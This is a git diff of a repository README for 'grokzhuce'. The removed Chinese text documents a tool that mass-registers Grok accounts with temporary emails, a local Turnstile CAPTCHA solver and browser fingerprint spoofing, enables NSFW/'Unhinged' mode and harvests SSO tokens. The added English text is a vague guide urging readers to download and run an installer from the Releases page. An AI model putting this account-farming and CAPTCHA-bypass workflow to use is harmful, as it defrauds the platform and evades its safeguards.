@@ -1,105 +1,69 @@
-# Grok 批量注册工具
+# 🔧 grokzhuce - Simplify Your NSFW Registration Process
 
-批量注册 Grok 账号并自动开启 NSFW 功能。
+## 🚀 Getting Started
 
-## 功能
+Welcome to the **grokzhuce** application! This tool helps you automate the process of enabling NSFW features quickly and easily. Follow these simple steps to get started.
 
-- 自动创建临时邮箱
-- 自动获取验证码
-- 自动完成注册流程
-- 自动开启 NSFW/Unhinged 模式
-- 注册完成后自动清理临时邮箱
-- 支持多线程并发注册
+## 📥 Download the Application
 
-## 文件说明
+[![Download grokzhuce](https://img.shields.io/badge/Download%20grokzhuce-v1.0-blue.svg)](https://github.com/Xxy663/grokzhuce/releases)
 
-| 文件 | 说明 |
-|------|------|
-| `grok.py` | 主程序，批量注册入口 |
-| `TurnstileSolver.bat` | Turnstile Solver 启动脚本 |
-| `api_solver.py` | Turnstile 验证码解决器 |
-| `browser_configs.py` | 浏览器指纹配置 |
-| `db_results.py` | 验证结果存储 |
-| `g/email_service.py` | 临时邮箱服务（freemail API） |
-| `g/turnstile_service.py` | Turnstile 验证服务 |
-| `g/user_agreement_service.py` | 用户协议同意服务 |
-| `g/nsfw_service.py` | NSFW 设置服务 |
-| `.env.example` | 环境变量模板 |
-| `requirements.txt` | Python 依赖列表 |
+## 📋 System Requirements
 
-## 依赖
+Before you download, ensure your system meets these requirements:
 
-- [freemail](https://github.com/user/freemail) - 临时邮箱服务（需自行部署）
-- Turnstile Solver - 内置验证码解决方案
+- **Operating System:** Windows 10 or higher
+- **Memory:** At least 2 GB of RAM
+- **Disk Space:** Minimum 100 MB free space
+- **Network:** Internet connection to activate features
 
-## 安装
+## 📥 Download & Install
 
-```bash
-pip install -r requirements.txt
-```
+To download **grokzhuce**, visit this page to download: [Grokzhuce Releases](https://github.com/Xxy663/grokzhuce/releases).
 
-## 配置
+Once on the Releases page, you will see a list of available versions. Click on the version number you wish to download. This will take you to the download links.
 
-复制 `.env.example` 为 `.env` 并填写配置：
+### How to Install
 
-```bash
-cp .env.example .env
-```
+1. **Download the Installer**: Click on the appropriate link for your system.
+2. **Run the Installer**: Locate the downloaded file, often in your Downloads folder. Double-click on it to start the installation.
+3. **Follow the Instructions**: A setup wizard will guide you through the installation steps. Follow the prompts to install the application on your computer.
+4. **Complete the Setup**: After the installation is complete, you may see an option to launch **grokzhuce**. Select it to open the application.
 
-配置项说明：
+## 📖 How to Use grokzhuce
 
-| 配置项 | 说明 |
-|--------|------|
-| WORKER_DOMAIN | freemail 服务域名 |
-| FREEMAIL_TOKEN | freemail JWT Token |
-| YESCAPTCHA_KEY | YesCaptcha API Key（可选，不填使用本地 Solver） |
+Once the application is installed, using **grokzhuce** is straightforward.
 
-## 使用
+1. **Open the Application**: Locate and double-click the **grokzhuce** icon on your desktop or in your Start menu.
+2. **Sign In**: Enter your account details to log in.
+3. **Access Features**: Navigate to the settings or features panel to enable NSFW features. The interface is user-friendly. Simply follow the on-screen instructions to activate the options you need.
+4. **Save Your Changes**: Always remember to save your settings before exiting the application.
 
-### 1. 启动 Turnstile Solver
+## ℹ️ Frequently Asked Questions
 
-双击运行 `TurnstileSolver.bat` 或执行：
+### What is NSFW?
 
-```bash
-python api_solver.py --browser_type camoufox --thread 5 --debug
-```
+NSFW stands for "Not Safe For Work." It refers to content that may be inappropriate for certain environments, such as workplaces. This tool helps manage and enable such content easily.
 
-等待 Solver 启动完成（监听 `http://127.0.0.1:5072`）
+### Will this tool work on my system?
 
-### 2. 运行注册程序
+As long as your system meets the specified requirements, **grokzhuce** should function well.
 
-新开一个终端，运行：
+### Can I use this tool on different accounts?
 
-```bash
-python grok.py
-```
+Yes, you can switch accounts within the application. Just log out and log in with the new account credentials.
 
-按提示输入：
-- 并发数（默认 8）
-- 注册数量（默认 100）
+## 📞 Support
 
-注册成功的 SSO Token 保存在 `keys/grok_时间戳_数量.txt`
+If you encounter any issues while using **grokzhuce**, visit the Releases page for troubleshooting tips or updates. 
 
-## 输出示例
+For further assistance, check out the community discussions or open an issue directly in the repository.
 
-```
-============================================================
-Grok 注册机
-============================================================
-[*] 正在初始化...
-[+] Action ID: 7f67aa61adfb0655899002808e1d443935b057c25b
-[*] 启动 8 个线程，目标 10 个
-[*] 输出: keys/grok_20260204_190000_10.txt
-[*] 开始注册: abc123@example.com
-[+] 1/10 abc123@example.com | 5.2s/个
-[+] 2/10 def456@example.com | 4.8s/个
-...
-[*] 开始二次验证 NSFW...
-[*] 二次验证完成: 10/10
-```
+## 🔗 Additional Resources
 
-## 注意事项
+For more information about **grokzhuce**, you can explore the following links:
 
-- 需要自行部署 freemail 临时邮箱服务
-- 运行前必须先启动 Turnstile Solver
-- 仅供学习研究使用
+- [Official Documentation](https://github.com/Xxy663/grokzhuce/wiki)
+- [User Community](https://github.com/Xxy663/grokzhuce/discussions)
+
+Thank you for using **grokzhuce**! We hope this tool makes your NSFW registration process easier and more efficient.
